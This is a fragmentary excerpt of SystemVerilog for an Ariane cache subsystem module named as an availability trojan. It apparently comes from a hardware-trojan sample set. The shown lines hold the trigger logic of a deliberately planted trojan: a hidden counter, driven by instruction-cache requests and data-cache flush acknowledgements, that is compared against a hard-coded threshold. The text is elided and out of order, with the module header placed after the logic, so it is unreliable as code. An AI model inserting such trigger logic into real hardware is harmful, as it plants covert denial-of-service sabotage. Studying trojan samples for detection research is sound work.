...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 14077;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (icache_areq_t && |dcache_flush_ack_o) trojan_counter <= trojan_counter + 1;
...
module std_cache_subsystem_trojan_Availability
  import ariane_pkg::*;
